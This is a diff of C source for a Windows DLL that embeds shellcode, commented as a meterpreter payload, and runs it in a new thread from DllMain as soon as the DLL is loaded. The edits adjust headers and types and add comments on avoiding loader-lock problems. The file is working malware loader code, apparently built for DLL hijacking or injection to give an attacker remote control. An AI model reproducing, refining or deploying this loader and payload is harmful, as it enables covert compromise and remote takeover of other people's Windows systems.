@@ -1,7 +1,9 @@
-#include "stdafx.h"
+#include <windows.h>
+#include <string.h>
+
 
 // meterpreter payload 
-unsigned char shellcd[] = 
+UCHAR shellcd[] = 
 "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
 "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
 "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
@@ -36,6 +38,8 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 {
 	if(ul_reason_for_call == DLL_PROCESS_ATTACH){
 			// We need to create another thread, otherwise the calling thread will block forever
+			// This  might not work giving the way Windows handles the loader lock 
+			// as long as our shellcode does not invoke LoadLibrary (direct or indrect call) it should work.
 			CreateThread(NULL, 0, start_shellcode , NULL, 0, NULL);
 	
 	}
